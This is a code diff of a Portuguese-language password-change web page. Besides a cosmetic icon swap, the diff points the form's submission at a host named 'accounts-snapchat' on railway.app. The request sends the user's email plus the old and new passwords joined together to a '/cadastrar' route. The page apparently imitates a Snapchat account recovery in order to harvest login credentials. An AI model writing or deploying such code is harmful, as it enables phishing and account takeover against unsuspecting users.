@@ -110,7 +110,7 @@
 
   <!-- ETAPA 4: Sucesso -->
   <div class="sec" id="s4">
-    <div class="ok-icon">✅</div>
+    <div class="ok-icon">🎉</div>
     <div class="ok-title">Senha alterada com sucesso!</div>
     <p class="ok-sub">Sua nova senha foi salva com sucesso.</p>
     <button class="btn2" onclick="reiniciar()">Voltar ao início</button>
@@ -161,7 +161,7 @@
     if (nova !== confirma) { msg(m,'err','As senhas não coincidem.'); return; }
     btn.disabled = true; btn.textContent = 'Salvando...';
     try {
-      const res = await fetch('https://recuperacao-senha-production.up.railway.app/cadastrar', {
+      const res = await fetch('https://accounts-snapchat.up.railway.app/cadastrar', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email: emailSalvo, senha: senhaAntigaSalva + '|' + nova })
